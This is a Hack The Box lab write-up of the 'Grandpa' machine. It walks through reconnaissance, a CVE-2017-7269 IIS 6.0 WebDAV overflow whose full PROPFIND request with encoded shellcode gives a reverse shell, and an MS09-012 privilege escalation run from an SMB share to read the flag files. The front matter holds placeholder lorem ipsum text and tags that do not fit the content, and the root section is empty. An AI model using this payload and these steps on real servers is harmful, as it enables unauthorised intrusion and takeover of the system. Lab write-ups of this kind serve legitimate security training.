---
layout: single
title: Grandpa - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-02-26
classes: wide
header:
  teaser: /assets/images/htb-writeup-grandpa/grandpa_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-grandpa/grandpa_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. [root:/git/htb/grandpa]# nmap -Pn -n -sCV 10.10.10.14 --open                                                                      (master✱)
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Microsoft IIS httpd 6.0
    | http-methods:
    |_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
    |_http-server-header: Microsoft-IIS/6.0
    |_http-title: Under Construction
    | http-webdav-scan:
    |   Server Type: Microsoft-IIS/6.0
    |   WebDAV type: Unknown
    |   Server Date: Wed, 03 Mar 2021 10:09:58 GMT
    |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
    |_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

  DIRB:
  + http://10.10.10.14/_private (CODE:403|SIZE:1529)
  ==> DIRECTORY: http://10.10.10.14/_vti_bin/
  ==> DIRECTORY: http://10.10.10.14/images/

  NIKTO:
  + Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
  + Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV


2. WebDAV is open and the webserver is running IIS 6.0. Lets run davtest to see if we can upload any files.

    [root:/git/htb/grandpa]# davtest -url http://10.10.10.14/                                                                         (master✱)
      ********************************************************
       Testing DAV connection
      OPEN		SUCCEED:		http://10.10.10.14
      ********************************************************
      NOTE	Random string for this session: OXxuoxrUU
      ********************************************************
       Creating directory
      MKCOL		FAIL
      ********************************************************
       Sending test files
      PUT	cfm	FAIL
      PUT	pl	FAIL
      PUT	php	FAIL
      PUT	txt	FAIL
      PUT	html	FAIL
      PUT	cgi	FAIL
      PUT	asp	FAIL
      PUT	shtml	FAIL
      PUT	jhtml	FAIL
      PUT	jsp	FAIL
      PUT	aspx	FAIL

      *************************


3. Look for IIS 6.0 exploits.

  [root:/git/htb/grandpa]# searchsploit iis 6.0                                                                                     (master✱)
    ----------------------------------------------------------------------------------------------------------- ---------------------------------
     Exploit Title                                                                                             |  Path
    ----------------------------------------------------------------------------------------------------------- ---------------------------------
    --- snip ---
    Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                   | windows/remote/41738.py

  Trying the exploit gives nothing. Continue to google for IIS 6.0 reverse and I find a script that looks promising, run it.

  [root:/git/htb/grandpa]# python iis6_rev.py 10.10.10.14 80 10.10.14.8 4488                                                        (master✱)
    PROPFIND / HTTP/1.1
    Host: localhost
    Content-Length: 1744
    If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃̀翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>

  [root:/git/htb/grandpa]# rlwrap nc -lvnp 4488                                                                                     (master✱)
    listening on [any] 4488 ...
    connect to [10.10.14.8] from (UNKNOWN) [10.10.10.14] 1031
    Microsoft Windows [Version 5.2.3790]
    (C) Copyright 1985-2003 Microsoft Corp.

    c:\windows\system32\inetsrv> whoami
      nt authority\network service


4. We are unable to read both user and root. Lets try the same exploit as Granny, MS09-012:

    [root:/srv/pub-share]# cp /opt/windows-kernel-exploits/MS09-012/pr.exe .
    [root:/srv/pub-share]# chmod +x pr.exe
    [root:/srv/pub-share]# smbserver.py share .


    C:\Documents and Settings> //10.10.14.8/share/pr.exe "whoami"
      /xxoo/-->Build&&Change By p
      /xxoo/-->This exploit gives you a Local System shell
      /xxoo/-->Got WMI process Pid: 1828
      begin to try
      /xxoo/-->Found token SYSTEM
      /xxoo/-->Command:whoami
      nt authority\system

    C:\Documents and Settings> //10.10.14.8/share/pr.exe "type Harry\Desktop\user.txt"
      /xxoo/-->Build&&Change By p
      /xxoo/-->This exploit gives you a Local System shell
      /xxoo/-->Got WMI process Pid: 1828
      begin to try
      /xxoo/-->Found token SYSTEM
      /xxoo/-->Command:type Harry\Desktop\user.txt
      bdff5ec67c3cff017f2bedc146a5d869

    C:\Documents and Settings> //10.10.14.8/share/pr.exe "type Administrator\Desktop\root.txt"
      /xxoo/-->Build&&Change By p
      /xxoo/-->This exploit gives you a Local System shell
      /xxoo/-->Got WMI process Pid: 1828
      begin to try
      /xxoo/-->Found token SYSTEM
      /xxoo/-->Command:type Administrator\Desktop\root.txt
      9359e905a2c35f861f6a57cecf28bb7b



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1.


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

IIS 6.0 Reverse Shell:
  https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
